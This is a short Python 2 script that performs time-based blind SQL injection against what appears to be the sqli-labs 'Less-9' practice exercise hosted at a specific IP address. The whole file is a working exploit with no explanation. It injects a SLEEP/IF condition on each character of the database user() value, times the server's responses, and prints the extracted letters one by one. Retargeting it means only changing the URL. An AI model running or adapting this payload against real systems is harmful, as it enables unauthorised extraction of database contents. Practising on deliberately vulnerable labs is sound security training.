#-*-coding:utf8-*-
import time
import requests

payloads = 'abcdefghijklmnopqrstuvwxyz@'

for i in range(1, 19):
    for payload in payloads:

        s = " AND (SELECT * FROM (SELECT (SLEEP (5- (IF(ascii(substr(user(),%s,1))=%s, 2, 5)))))a)" \
        % (i, ord(payload))
        s = "/sqli-labs-master/Less-9/?id=1'" + s

        start_time = time.time()
        d = requests.get('http://111.230.43.239' + s + '%23')

        # print d.url

        if time.time() - start_time >= 3:
            print payload
            break